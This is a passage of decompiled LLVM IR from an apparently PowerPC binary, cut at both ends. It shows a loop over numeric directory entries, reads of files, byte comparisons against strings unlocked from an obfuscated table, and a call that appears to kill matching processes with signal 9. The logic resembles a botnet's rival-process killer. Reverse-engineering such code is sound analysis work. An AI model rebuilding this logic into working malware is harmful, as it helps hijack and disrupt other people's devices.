  %v3_10006a70 = call i32 @function_1000b670(i32 %v2_100069c8, i32 %v3_10006a64, i32 4095)
  %v3_10006a74 = icmp eq i32 %v3_10006a70, -1
  br i1 %v3_10006a74, label %dec_label_pc_10006a84, label %dec_label_pc_10006a7c

dec_label_pc_10006a7c:                            ; preds = %dec_label_pc_10006a50
  %v3_10006a7c = load i32, i32* @global_var_1001eb20.101, align 4
  %v0_10006a80 = load i32, i32* @r30, align 4
  %v3_10006a80 = trunc i32 %v0_10006a80 to i8
  %v4_10006a80 = add i32 %v3_10006a7c, %v3_10006a70
  %v5_10006a80 = inttoptr i32 %v4_10006a80 to i8*
  store i8 %v3_10006a80, i8* %v5_10006a80, align 1
  br label %dec_label_pc_10006a84

dec_label_pc_10006a84:                            ; preds = %dec_label_pc_10006a50, %dec_label_pc_10006a7c
  %v0_10006a84 = load i32, i32* %r29.global-to-local, align 4
  %v1_10006a84 = load i32, i32* @r31, align 4
  %v2_10006a84 = add i32 %v1_10006a84, %v0_10006a84
  store i32 %v2_100069c8, i32* @r3, align 4
  %v0_10006a8c = load i32, i32* %r21.global-to-local, align 4
  %v2_10006a8c = sub i32 %v2_10006a84, %v0_10006a8c
  store i32 %v2_10006a8c, i32* @r4, align 4
  %v0_10006a90 = load i32, i32* @r28, align 4
  store i32 %v0_10006a90, i32* %r29.global-to-local, align 4
  store i32 268462744, i32* @lr, align 4
  %v0_10006a94 = call i32 @function_1000ac0c()
  store i32 400, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  %v2_10006aa0 = ptrtoint i32* %stack_var_-8404 to i32
  store i32 %v2_10006aa0, i32* @r22, align 4
  %v2_10006aa4 = ptrtoint i32* %stack_var_-8340 to i32
  store i32 %v2_10006aa4, i32* %r20.global-to-local, align 4
  %v2_10006aa8 = ptrtoint i32* %stack_var_-8276 to i32
  %v2_10006b78 = bitcast i32* %stack_var_-8404 to i8*
  %v2_10006bbc = bitcast i32* %stack_var_-8340 to i8*
  %v3_10006c44 = bitcast i32* %stack_var_-8276 to i8*
  br label %dec_label_pc_10006aac

dec_label_pc_10006aac:                            ; preds = %dec_label_pc_10006b3c, %dec_label_pc_10006a84
  store i32 268462772, i32* @lr, align 4
  %v1_10006ab0 = call i32 @function_1000a2ec(i32 6)
  %v3_10006abc = call i32 @function_1000a238(i32 6, i32* null)
  store i32 268462788, i32* @lr, align 4
  %v1_10006ac0 = call i32 @function_1000b93c(i32 %v3_10006abc)
  store i32 %v1_10006ac0, i32* @r27, align 4
  %v3_10006ac4 = icmp eq i32 %v1_10006ac0, 0
  br i1 %v3_10006ac4, label %dec_label_pc_10006874, label %dec_label_pc_10006acc

dec_label_pc_10006acc:                            ; preds = %dec_label_pc_10006aac
  store i32 268462804, i32* @lr, align 4
  %v1_10006ad0 = call i32 @function_1000a260(i32 6)
  %v0_10006ad413 = load i32, i32* @r27, align 4
  store i32 268462812, i32* @lr, align 4
  %v1_10006ad814 = inttoptr i32 %v0_10006ad413 to i32*
  %v2_10006ad815 = call i32 @function_1000ba4c(i32* %v1_10006ad814)
  %v3_10006adc18 = icmp eq i32 %v2_10006ad815, 0
  br i1 %v3_10006adc18, label %dec_label_pc_10006b3c, label %dec_label_pc_10006ae4.preheader

dec_label_pc_10006ae4.preheader:                  ; preds = %dec_label_pc_10006acc, %dec_label_pc_10006ad4.backedge
  %v0_10006ae421 = phi i32 [ %v2_10006ad8, %dec_label_pc_10006ad4.backedge ], [ %v2_10006ad815, %dec_label_pc_10006acc ]
  br label %dec_label_pc_10006ae4

dec_label_pc_10006ae4:                            ; preds = %dec_label_pc_10006ae4.preheader, %dec_label_pc_10006b28
  %v0_10006af8 = phi i32 [ %v0_10006ae421, %dec_label_pc_10006ae4.preheader ], [ %v2_10006b30, %dec_label_pc_10006b28 ]
  %v1_10006ae4 = add i32 %v0_10006af8, 11
  %v2_10006ae4 = inttoptr i32 %v1_10006ae4 to i8*
  %v3_10006ae4 = load i8, i8* %v2_10006ae4, align 1
  %v4_10006ae4 = zext i8 %v3_10006ae4 to i32
  %v1_10006ae8 = add nuw nsw i32 %v4_10006ae4, 208
  %v1_10006aec = urem i32 %v1_10006ae8, 256
  %v2_10006af0 = icmp ugt i32 %v1_10006aec, 9
  br i1 %v2_10006af0, label %dec_label_pc_10006ad4.backedge, label %dec_label_pc_10006af8

dec_label_pc_10006af8:                            ; preds = %dec_label_pc_10006ae4
  %v0_10006afc = load i32, i32* @r23, align 4
  %v1_10006afc = add i32 %v0_10006afc, 1
  store i32 %v1_10006afc, i32* @r23, align 4
  store i32 268462856, i32* @lr, align 4
  %v3_10006b04 = call i32 @function_1000ca98(i8* %v2_10006ae4, i32 %v1_10006aec)
  %v0_10006b08 = load i32, i32* @r28, align 4
  %v2_10006b08 = icmp slt i32 %v0_10006b08, %v3_10006b04
  store i32 %v3_10006b04, i32* %r30.global-to-local, align 4
  br i1 %v2_10006b08, label %dec_label_pc_10006b48, label %dec_label_pc_10006b14

dec_label_pc_10006b14:                            ; preds = %dec_label_pc_10006af8
  store i32 268462876, i32* @lr, align 4
  %v0_10006b18 = call i32 @function_1000b7c0()
  %v0_10006b1c = load i32, i32* @r29, align 4
  %v2_10006b1c = sub i32 %v0_10006b18, %v0_10006b1c
  %tmp86 = icmp slt i32 %v2_10006b1c, 601
  br i1 %tmp86, label %dec_label_pc_10006ca4, label %dec_label_pc_10006b28

dec_label_pc_10006b28:                            ; preds = %dec_label_pc_10006b14
  %v0_10006b28 = load i32, i32* @r27, align 4
  store i32 400, i32* %r28.global-to-local, align 4
  store i32 268462900, i32* @lr, align 4
  %v1_10006b30 = inttoptr i32 %v0_10006b28 to i32*
  %v2_10006b30 = call i32 @function_1000ba4c(i32* %v1_10006b30)
  %v3_10006b34 = icmp eq i32 %v2_10006b30, 0
  br i1 %v3_10006b34, label %dec_label_pc_10006b3c, label %dec_label_pc_10006ae4

dec_label_pc_10006b3c:                            ; preds = %dec_label_pc_10006ad4.backedge, %dec_label_pc_10006b28, %dec_label_pc_10006acc
  %v0_10006b3c = load i32, i32* @r27, align 4
  store i32 268462916, i32* @lr, align 4
  %v1_10006b40 = inttoptr i32 %v0_10006b3c to i32*
  %v2_10006b40 = call i32 @function_1000b898(i32* %v1_10006b40)
  br label %dec_label_pc_10006aac

dec_label_pc_10006b48:                            ; preds = %dec_label_pc_10006af8
  store i32 268462928, i32* @lr, align 4
  %v0_10006b4c = call i32 @function_1000b7c0()
  store i32 %v0_10006b4c, i32* %r19.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006b5c.106 to i32), i32* @lr, align 4
  %v1_10006b58 = call i32 @function_1000a2ec(i32 6)
  store i32 268462948, i32* @lr, align 4
  %v1_10006b60 = call i32 @function_1000a2ec(i32 7)
  %v3_10006b6c = call i32 @function_1000a238(i32 6, i32* null)
  store i32 %v2_10006aa0, i32* @r3, align 4
  %v3_10006b78 = call i32 @function_1000ab8c(i8* %v2_10006b78, i32 %v3_10006b6c)
  %v0_10006b7c = load i32, i32* @r31, align 4
  %v0_10006b80 = load i32, i32* @r22, align 4
  %v2_10006b80 = add i32 %v0_10006b80, %v3_10006b78
  store i32 %v2_10006b80, i32* %r28.global-to-local, align 4
  store i32 %v2_10006b80, i32* @r3, align 4
  %v2_10006b88 = inttoptr i32 %v2_10006b80 to i8*
  %v3_10006b88 = call i32 @function_1000ab8c(i8* %v2_10006b88, i32 %v0_10006b7c)
  store i32 %v3_10006b88, i32* %r29.global-to-local, align 4
  %v3_10006b98 = call i32 @function_1000a238(i32 7, i32* null)
  %v2_10006ba0 = add i32 %v3_10006b88, %v2_10006b80
  store i32 %v2_10006ba0, i32* @r3, align 4
  %v2_10006ba4 = inttoptr i32 %v2_10006ba0 to i8*
  %v3_10006ba4 = call i32 @function_1000ab8c(i8* %v2_10006ba4, i32 %v3_10006b98)
  %v3_10006bb0 = call i32 @function_1000a238(i32 6, i32* null)
  store i32 %v2_10006aa4, i32* @r3, align 4
  %v3_10006bbc = call i32 @function_1000ab8c(i8* %v2_10006bbc, i32 %v3_10006bb0)
  %v0_10006bc0 = load i32, i32* @r31, align 4
  %v0_10006bc4 = load i32, i32* %r20.global-to-local, align 4
  %v2_10006bc4 = add i32 %v0_10006bc4, %v3_10006bbc
  store i32 %v2_10006bc4, i32* %r28.global-to-local, align 4
  store i32 %v2_10006bc4, i32* @r3, align 4
  %v2_10006bcc = inttoptr i32 %v2_10006bc4 to i8*
  %v3_10006bcc = call i32 @function_1000ab8c(i8* %v2_10006bcc, i32 %v0_10006bc0)
  store i32 %v3_10006bcc, i32* %r29.global-to-local, align 4
  %v3_10006bdc = call i32 @function_1000a238(i32 11, i32* null)
  %v2_10006be4 = add i32 %v3_10006bcc, %v2_10006bc4
  store i32 %v2_10006be4, i32* @r3, align 4
  %v2_10006be8 = inttoptr i32 %v2_10006be4 to i8*
  %v3_10006be8 = call i32 @function_1000ab8c(i8* %v2_10006be8, i32 %v3_10006bdc)
  store i32 ptrtoint ([3 x i8]* @global_var_10006bf4.108 to i32), i32* @lr, align 4
  %v1_10006bf0 = call i32 @function_1000a260(i32 6)
  store i32 268463100, i32* @lr, align 4
  %v1_10006bf8 = call i32 @function_1000a260(i32 7)
  store i32 4095, i32* @r5, align 4
  store i32 268463116, i32* @lr, align 4
  %v3_10006c08 = call i32 @function_1000b670(i32 %v2_10006aa0, i32 %v2_10006aa8, i32 4095)
  %v3_10006c0c = icmp eq i32 %v3_10006c08, -1
  store i32 %v3_10006c08, i32* %r29.global-to-local, align 4
  br i1 %v3_10006c0c, label %dec_label_pc_10006cf8, label %dec_label_pc_10006c18

dec_label_pc_10006c18:                            ; preds = %dec_label_pc_10006b48
  %v0_10006c18 = load i32, i32* @r1, align 4
  %v2_10006c18 = add i32 %v0_10006c18, %v3_10006c08
  %v3_10006c20 = add i32 %v2_10006c18, 188
  %v4_10006c20 = inttoptr i32 %v3_10006c20 to i8*
  store i8 0, i8* %v4_10006c20, align 1
  store i32 268463148, i32* @lr, align 4
  %v1_10006c28 = call i32 @function_1000a2ec(i32 10)
  %v3_10006c34 = call i32 @function_1000a238(i32 10, i32* null)
  %v0_10006c38 = load i32, i32* %r29.global-to-local, align 4
  %v1_10006c38 = add i32 %v0_10006c38, -1
  %v4_10006c44 = call i32 @function_1000af14(i8* %v3_10006c44, i32 %v1_10006c38, i32 %v3_10006c34)
  %v3_10006c48 = icmp eq i32 %v4_10006c44, -1
  br i1 %v3_10006c48, label %dec_label_pc_10006c64, label %dec_label_pc_10006c50

dec_label_pc_10006c50:                            ; preds = %dec_label_pc_10006c18
  store i32 268463192, i32* @lr, align 4
  %v1_10006c54 = call i32 @function_1000b808(i32 %v2_10006aa8)
  %v0_10006c58 = load i32, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006c64.109 to i32), i32* @lr, align 4
  %v2_10006c60 = call i32 @function_1000b510(i32 %v0_10006c58, i32 9)
  br label %dec_label_pc_10006c64

dec_label_pc_10006c64:                            ; preds = %dec_label_pc_10006c18, %dec_label_pc_10006c50
  store i32 ptrtoint (i32* @global_var_10006c6c.110 to i32), i32* @lr, align 4
  %v1_10006c68 = call i32 @function_1000a260(i32 10)
  store i32 268463216, i32* @lr, align 4
  %v0_10006c6c = call i32 @function_1000b480()
  %v0_10006c70 = load i32, i32* %r30.global-to-local, align 4
  %v4_10006c70 = icmp eq i32 %v0_10006c70, %v0_10006c6c
  br i1 %v4_10006c70, label %dec_label_pc_10006c98, label %dec_label_pc_10006c78

dec_label_pc_10006c78:                            ; preds = %dec_label_pc_10006c64
  store i32 268463228, i32* @lr, align 4
  %v0_10006c78 = call i32 @function_1000b4c8()
  %v0_10006c7c = load i32, i32* %r30.global-to-local, align 4
  %v4_10006c7c = icmp eq i32 %v0_10006c7c, %v0_10006c78
  br i1 %v4_10006c7c, label %dec_label_pc_10006c98, label %dec_label_pc_10006c84

dec_label_pc_10006c84:                            ; preds = %dec_label_pc_10006c78
  %v3_10006c84 = load i32, i32* @global_var_1001eb20.101, align 4
  %v3_10006c8c = call i32 @function_1000afc0(i8* %v3_10006c44, i32 %v3_10006c84)
  %v3_10006c90 = icmp eq i32 %v3_10006c8c, 0
  br i1 %v3_10006c90, label %dec_label_pc_10006cd4, label %dec_label_pc_10006c84.dec_label_pc_10006c98_crit_edge

dec_label_pc_10006c84.dec_label_pc_10006c98_crit_edge: ; preds = %dec_label_pc_10006c84
  %v0_10006c98.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10006c98

dec_label_pc_10006c98:                            ; preds = %dec_label_pc_10006c84.dec_label_pc_10006c98_crit_edge, %dec_label_pc_10006c78, %dec_label_pc_10006c64
  %v0_10006c98 = phi i32 [ %v0_10006c98.pre, %dec_label_pc_10006c84.dec_label_pc_10006c98_crit_edge ], [ %v0_10006c78, %dec_label_pc_10006c78 ], [ %v0_10006c6c, %dec_label_pc_10006c64 ]
  store i32 %v0_10006c98, i32* %r28.global-to-local, align 4
  %v0_10006c9c = load i32, i32* %r19.global-to-local, align 4
  store i32 %v0_10006c9c, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10006ad4.backedge

dec_label_pc_10006ad4.backedge:                   ; preds = %dec_label_pc_10006ae4, %dec_label_pc_10006c98, %dec_label_pc_10006cc8, %dec_label_pc_10006f38, %dec_label_pc_10006ca4, %dec_label_pc_10006cac
  %v0_10006ad4 = load i32, i32* @r27, align 4
  store i32 268462812, i32* @lr, align 4
  %v1_10006ad8 = inttoptr i32 %v0_10006ad4 to i32*
  %v2_10006ad8 = call i32 @function_1000ba4c(i32* %v1_10006ad8)
  %v3_10006adc = icmp eq i32 %v2_10006ad8, 0
  br i1 %v3_10006adc, label %dec_label_pc_10006b3c, label %dec_label_pc_10006ae4.preheader

dec_label_pc_10006ca4:                            ; preds = %dec_label_pc_10006b14
  %v0_10006ca4 = load i32, i32* %r30.global-to-local, align 4
  %tmp87 = icmp slt i32 %v0_10006ca4, 401
  br i1 %tmp87, label %dec_label_pc_10006ad4.backedge, label %dec_label_pc_10006cac

dec_label_pc_10006cac:                            ; preds = %dec_label_pc_10006ca4
  %v0_10006cb4 = load i32, i32* @r23, align 4
  %v1_10006cb8 = urem i32 %v0_10006cb4, 10
  %v4_10006cc0 = icmp eq i32 %v1_10006cb8, 0
  br i1 %v4_10006cc0, label %dec_label_pc_10006cc8, label %dec_label_pc_10006ad4.backedge

dec_label_pc_10006cc8:                            ; preds = %dec_label_pc_10006cac
  store i32 268463312, i32* @lr, align 4
  %v1_10006ccc = call i32 @function_1000cce4(i32 1)
  br label %dec_label_pc_10006ad4.backedge

dec_label_pc_10006cd4:                            ; preds = %dec_label_pc_10006c84
  store i32 268463332, i32* @lr, align 4
  %v2_10006ce0 = call i32 @function_1000b558(i32 %v2_10006aa8, i32 0)
  %v3_10006ce4 = icmp eq i32 %v2_10006ce0, -1
  store i32 %v2_10006ce0, i32* @r31, align 4
  br i1 %v3_10006ce4, label %dec_label_pc_10006f94, label %dec_label_pc_10006cf0

dec_label_pc_10006cf0:                            ; preds = %dec_label_pc_10006cd4, %dec_label_pc_10006f94
  store i32 268463352, i32* @lr, align 4
  %v0_10006cf4 = call i32 @function_1000b3f0()
  br label %dec_label_pc_10006cf8

dec_label_pc_10006cf8:                            ; preds = %dec_label_pc_10006b48, %dec_label_pc_10006cf0
  store i32 268463368, i32* @lr, align 4
  %v2_10006d04 = call i32 @function_1000b558(i32 %v2_10006aa0, i32 0)
  %v3_10006d08 = icmp eq i32 %v2_10006d04, -1
  store i32 %v2_10006d04, i32* %r24.global-to-local, align 4
  br i1 %v3_10006d08, label %dec_label_pc_10006f38, label %dec_label_pc_10006d14

dec_label_pc_10006d14:                            ; preds = %dec_label_pc_10006cf8
  store i32 ptrtoint ([3 x i8]* @global_var_10006d1c.111 to i32), i32* @lr, align 4
  %v1_10006d18 = call i32 @function_1000a2ec(i32 12)
  store i32 ptrtoint ([3 x i8]* @global_var_10006d24.112 to i32), i32* @lr, align 4
  %v1_10006d20 = call i32 @function_1000a2ec(i32 13)
  store i32 ptrtoint ([3 x i8]* @global_var_10006d2c.113 to i32), i32* @lr, align 4
  %v1_10006d28 = call i32 @function_1000a2ec(i32 14)
  store i32 ptrtoint ([3 x i8]* @global_var_10006d34.114 to i32), i32* @lr, align 4
  %v1_10006d30 = call i32 @function_1000a2ec(i32 15)
  store i32 268463420, i32* @lr, align 4
  %v1_10006d38 = call i32 @function_1000a2ec(i32 16)
  %v3_10006d44 = call i32 @function_1000a238(i32 12, i32* nonnull %stack_var_-8452)
  store i32 %v3_10006d44, i32* @r31, align 4
  %v3_10006d54 = call i32 @function_1000a238(i32 13, i32* nonnull %stack_var_-8448)
  store i32 %v3_10006d54, i32* %r29.global-to-local, align 4
  %v3_10006d64 = call i32 @function_1000a238(i32 14, i32* nonnull %stack_var_-8444)
  store i32 %v3_10006d64, i32* %r28.global-to-local, align 4
  %v3_10006d74 = call i32 @function_1000a238(i32 15, i32* nonnull %stack_var_-8456)
  store i32 %v3_10006d74, i32* %r26.global-to-local, align 4
  %v3_10006d84 = call i32 @function_1000a238(i32 16, i32* nonnull %stack_var_-8440)
  store i32 %v3_10006d84, i32* %r25.global-to-local, align 4
  %v0_10006d8c94 = load i32, i32* %r24.global-to-local, align 4
  store i32 268463516, i32* @lr, align 4
  %v3_10006d9895 = call i32 @function_1000b628(i32 %v0_10006d8c94, i32 %v2_100069c8, i32 4096)
  %tmp8897 = icmp slt i32 %v3_10006d9895, 1
  br i1 %tmp8897, label %dec_label_pc_10006fa4, label %dec_label_pc_10006da4

dec_label_pc_10006da4:                            ; preds = %dec_label_pc_10006d14, %dec_label_pc_10006d8c.backedge
  %v3_10006d9898 = phi i32 [ %v3_10006d98, %dec_label_pc_10006d8c.backedge ], [ %v3_10006d9895, %dec_label_pc_10006d14 ]
  %v3_10006d9c99.in = phi i32 [ %v3_10006d98, %dec_label_pc_10006d8c.backedge ], [ %v3_10006d9895, %dec_label_pc_10006d14 ]
  %v3_10006d9c99 = icmp eq i32 %v3_10006d9c99.in, 0
  %v3_10006da4 = load i32, i32* %stack_var_-8452, align 4
  %v2_10006da8 = icmp slt i32 %v3_10006d9898, %v3_10006da4
  br i1 %v2_10006da8, label %dec_label_pc_10006de8, label %dec_label_pc_10006db0

dec_label_pc_10006db0:                            ; preds = %dec_label_pc_10006da4
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_10006dc4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006dc4

dec_label_pc_10006dc4:                            ; preds = %dec_label_pc_10006db0, %dec_label_pc_10006de0
  %v0_10006de4 = phi i32 [ %v3_10006d9898, %dec_label_pc_10006db0 ], [ %v1_10006de4, %dec_label_pc_10006de0 ]
  %v0_10006de0 = phi i32 [ %v2_100069c8, %dec_label_pc_10006db0 ], [ %v1_10006de0, %dec_label_pc_10006de0 ]
  %v1_10006dc4 = phi i32 [ 0, %dec_label_pc_10006db0 ], [ %v1_10006dc425, %dec_label_pc_10006de0 ]
  %v2_10006dc4 = add i32 %v1_10006dc4, %v0_10006dc4.pre
  %v3_10006dc4 = inttoptr i32 %v2_10006dc4 to i8*
  %v4_10006dc4 = load i8, i8* %v3_10006dc4, align 1
  %v1_10006dc8 = add i32 %v1_10006dc4, 1
  store i32 %v1_10006dc8, i32* %r11.global-to-local, align 4
  %v1_10006dcc = inttoptr i32 %v0_10006de0 to i8*
  %v2_10006dcc = load i8, i8* %v1_10006dcc, align 1
  %v4_10006dd4 = icmp eq i8 %v2_10006dcc, %v4_10006dc4
  br i1 %v4_10006dd4, label %dec_label_pc_10006ef8, label %dec_label_pc_10006ddc

dec_label_pc_10006ddc:                            ; preds = %dec_label_pc_10006dc4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006de0

dec_label_pc_10006de0:                            ; preds = %dec_label_pc_10006ef8, %dec_label_pc_10006ddc
  %v1_10006dc425 = phi i32 [ %v1_10006dc8, %dec_label_pc_10006ef8 ], [ 0, %dec_label_pc_10006ddc ]
  %v1_10006de0 = add i32 %v0_10006de0, 1
  %v1_10006de4 = add i32 %v0_10006de4, -1
  %v2_10006de4 = icmp eq i32 %v1_10006de4, 0
  br i1 %v2_10006de4, label %dec_label_pc_10006de8, label %dec_label_pc_10006dc4

dec_label_pc_10006de8:                            ; preds = %dec_label_pc_10006de0, %dec_label_pc_10006da4
  %v3_10006de8 = load i32, i32* %stack_var_-8448, align 4
  %v2_10006dec = icmp slt i32 %v3_10006d9898, %v3_10006de8
  br i1 %v2_10006dec, label %dec_label_pc_10006e2c, label %dec_label_pc_10006df4

dec_label_pc_10006df4:                            ; preds = %dec_label_pc_10006de8
  store i32 0, i32* %r11.global-to-local, align 4
  br i1 %v3_10006d9c99, label %dec_label_pc_10006e2c, label %dec_label_pc_10006e08.preheader

dec_label_pc_10006e08.preheader:                  ; preds = %dec_label_pc_10006df4
  %v0_10006e08.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10006e08

dec_label_pc_10006e08:                            ; preds = %dec_label_pc_10006e08.preheader, %dec_label_pc_10006e28
  %v0_10006e28 = phi i32 [ %v3_10006d9898, %dec_label_pc_10006e08.preheader ], [ %v1_10006e28, %dec_label_pc_10006e28 ]
  %storemerge.in = phi i32 [ %v2_100069c8, %dec_label_pc_10006e08.preheader ], [ %storemerge, %dec_label_pc_10006e28 ]
  %v1_10006e08 = phi i32 [ 0, %dec_label_pc_10006e08.preheader ], [ %v1_10006e0831, %dec_label_pc_10006e28 ]
  %v2_10006e08 = add i32 %v1_10006e08, %v0_10006e08.pre
  %v3_10006e08 = inttoptr i32 %v2_10006e08 to i8*
  %v4_10006e08 = load i8, i8* %v3_10006e08, align 1
  %v1_10006e0c = add i32 %v1_10006e08, 1
  store i32 %v1_10006e0c, i32* %r11.global-to-local, align 4
  %v1_10006e10 = inttoptr i32 %storemerge.in to i8*
  %v2_10006e10 = load i8, i8* %v1_10006e10, align 1
  %v4_10006e18 = icmp eq i8 %v2_10006e10, %v4_10006e08
  br i1 %v4_10006e18, label %dec_label_pc_10006f64, label %dec_label_pc_10006e20

dec_label_pc_10006e20:                            ; preds = %dec_label_pc_10006e08
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006e28

dec_label_pc_10006e28:                            ; preds = %dec_label_pc_10006f64, %dec_label_pc_10006e20
  %v1_10006e0831 = phi i32 [ %v1_10006e0c, %dec_label_pc_10006f64 ], [ 0, %dec_label_pc_10006e20 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_10006e28 = add i32 %v0_10006e28, -1
  %v2_10006e28 = icmp eq i32 %v1_10006e28, 0
  br i1 %v2_10006e28, label %dec_label_pc_10006e2c, label %dec_label_pc_10006e08

dec_label_pc_10006e2c:                            ; preds = %dec_label_pc_10006e28, %dec_label_pc_10006df4, %dec_label_pc_10006de8
  %v3_10006e2c = load i32, i32* %stack_var_-8444, align 4
  %v2_10006e30 = icmp slt i32 %v3_10006d9898, %v3_10006e2c
  br i1 %v2_10006e30, label %dec_label_pc_10006e70, label %dec_label_pc_10006e38

dec_label_pc_10006e38:                            ; preds = %dec_label_pc_10006e2c
  store i32 0, i32* %r11.global-to-local, align 4
  br i1 %v3_10006d9c99, label %dec_label_pc_10006e70, label %dec_label_pc_10006e4c.preheader

dec_label_pc_10006e4c.preheader:                  ; preds = %dec_label_pc_10006e38
  %v0_10006e4c.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10006e4c

dec_label_pc_10006e4c:                            ; preds = %dec_label_pc_10006e4c.preheader, %dec_label_pc_10006e6c
  %v0_10006e6c = phi i32 [ %v3_10006d9898, %dec_label_pc_10006e4c.preheader ], [ %v1_10006e6c, %dec_label_pc_10006e6c ]
  %storemerge3.in = phi i32 [ %v2_100069c8, %dec_label_pc_10006e4c.preheader ], [ %storemerge3, %dec_label_pc_10006e6c ]
  %v1_10006e4c = phi i32 [ 0, %dec_label_pc_10006e4c.preheader ], [ %v1_10006e4c37, %dec_label_pc_10006e6c ]
  %v2_10006e4c = add i32 %v1_10006e4c, %v0_10006e4c.pre
  %v3_10006e4c = inttoptr i32 %v2_10006e4c to i8*
  %v4_10006e4c = load i8, i8* %v3_10006e4c, align 1
  %v1_10006e50 = add i32 %v1_10006e4c, 1
  store i32 %v1_10006e50, i32* %r11.global-to-local, align 4
  %v1_10006e54 = inttoptr i32 %storemerge3.in to i8*
  %v2_10006e54 = load i8, i8* %v1_10006e54, align 1
  %v4_10006e5c = icmp eq i8 %v2_10006e54, %v4_10006e4c
  br i1 %v4_10006e5c, label %dec_label_pc_10006f70, label %dec_label_pc_10006e64

dec_label_pc_10006e64:                            ; preds = %dec_label_pc_10006e4c
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006e6c

dec_label_pc_10006e6c:                            ; preds = %dec_label_pc_10006f70, %dec_label_pc_10006e64
  %v1_10006e4c37 = phi i32 [ %v1_10006e50, %dec_label_pc_10006f70 ], [ 0, %dec_label_pc_10006e64 ]
  %storemerge3 = add i32 %storemerge3.in, 1
  %v1_10006e6c = add i32 %v0_10006e6c, -1
  %v2_10006e6c = icmp eq i32 %v1_10006e6c, 0
  br i1 %v2_10006e6c, label %dec_label_pc_10006e70, label %dec_label_pc_10006e4c

dec_label_pc_10006e70:                            ; preds = %dec_label_pc_10006e6c, %dec_label_pc_10006e38, %dec_label_pc_10006e2c
  %v3_10006e70 = load i32, i32* %stack_var_-8456, align 4
  %v2_10006e74 = icmp slt i32 %v3_10006d9898, %v3_10006e70
  br i1 %v2_10006e74, label %dec_label_pc_10006eb4, label %dec_label_pc_10006e7c

dec_label_pc_10006e7c:                            ; preds = %dec_label_pc_10006e70
  store i32 0, i32* %r11.global-to-local, align 4
  br i1 %v3_10006d9c99, label %dec_label_pc_10006eb4, label %dec_label_pc_10006e90.preheader

dec_label_pc_10006e90.preheader:                  ; preds = %dec_label_pc_10006e7c
  %v0_10006e90.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10006e90

dec_label_pc_10006e90:                            ; preds = %dec_label_pc_10006e90.preheader, %dec_label_pc_10006eb0
  %v0_10006eb0 = phi i32 [ %v3_10006d9898, %dec_label_pc_10006e90.preheader ], [ %v1_10006eb0, %dec_label_pc_10006eb0 ]
  %storemerge4.in = phi i32 [ %v2_100069c8, %dec_label_pc_10006e90.preheader ], [ %storemerge4, %dec_label_pc_10006eb0 ]
  %v1_10006e90 = phi i32 [ 0, %dec_label_pc_10006e90.preheader ], [ %v1_10006e9043, %dec_label_pc_10006eb0 ]
  %v2_10006e90 = add i32 %v1_10006e90, %v0_10006e90.pre
  %v3_10006e90 = inttoptr i32 %v2_10006e90 to i8*
  %v4_10006e90 = load i8, i8* %v3_10006e90, align 1
  %v1_10006e94 = add i32 %v1_10006e90, 1
  store i32 %v1_10006e94, i32* %r11.global-to-local, align 4
  %v1_10006e98 = inttoptr i32 %storemerge4.in to i8*
  %v2_10006e98 = load i8, i8* %v1_10006e98, align 1
  %v4_10006ea0 = icmp eq i8 %v2_10006e98, %v4_10006e90
  br i1 %v4_10006ea0, label %dec_label_pc_10006f7c, label %dec_label_pc_10006ea8

dec_label_pc_10006ea8:                            ; preds = %dec_label_pc_10006e90
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006eb0

dec_label_pc_10006eb0:                            ; preds = %dec_label_pc_10006f7c, %dec_label_pc_10006ea8
  %v1_10006e9043 = phi i32 [ %v1_10006e94, %dec_label_pc_10006f7c ], [ 0, %dec_label_pc_10006ea8 ]
  %storemerge4 = add i32 %storemerge4.in, 1
  %v1_10006eb0 = add i32 %v0_10006eb0, -1
  %v2_10006eb0 = icmp eq i32 %v1_10006eb0, 0
  br i1 %v2_10006eb0, label %dec_label_pc_10006eb4, label %dec_label_pc_10006e90

dec_label_pc_10006eb4:                            ; preds = %dec_label_pc_10006eb0, %dec_label_pc_10006e7c, %dec_label_pc_10006e70
  %v3_10006eb4 = load i32, i32* %stack_var_-8440, align 4
  %v2_10006eb8 = icmp slt i32 %v3_10006d9898, %v3_10006eb4
  br i1 %v2_10006eb8, label %dec_label_pc_10006d8c.backedge, label %dec_label_pc_10006ec0

dec_label_pc_10006ec0:                            ; preds = %dec_label_pc_10006eb4
  store i32 0, i32* %r11.global-to-local, align 4
  br i1 %v3_10006d9c99, label %dec_label_pc_10006d8c.backedge, label %dec_label_pc_10006ed4.lr.ph

dec_label_pc_10006d8c.backedge:                   ; preds = %dec_label_pc_10006ed0.backedge, %dec_label_pc_10006ec0, %dec_label_pc_10006eb4
  %v0_10006d8c = load i32, i32* %r24.global-to-local, align 4
  store i32 268463516, i32* @lr, align 4
  %v3_10006d98 = call i32 @function_1000b628(i32 %v0_10006d8c, i32 %v2_100069c8, i32 4096)
  %tmp88 = icmp slt i32 %v3_10006d98, 1
  br i1 %tmp88, label %dec_label_pc_10006fa4, label %dec_label_pc_10006da4

dec_label_pc_10006ed4.lr.ph:                      ; preds = %dec_label_pc_10006ec0
  %v0_10006ed4.pre = load i32, i32* %r25.global-to-local, align 4
  br label %dec_label_pc_10006ed4

dec_label_pc_10006ed4:                            ; preds = %dec_label_pc_10006ed4.lr.ph, %dec_label_pc_10006ed0.backedge
  %v0_10006ed0 = phi i32 [ %v3_10006d9898, %dec_label_pc_10006ed4.lr.ph ], [ %v1_10006ed0, %dec_label_pc_10006ed0.backedge ]
  %storemerge19.in = phi i32 [ %v2_100069c8, %dec_label_pc_10006ed4.lr.ph ], [ %storemerge19, %dec_label_pc_10006ed0.backedge ]
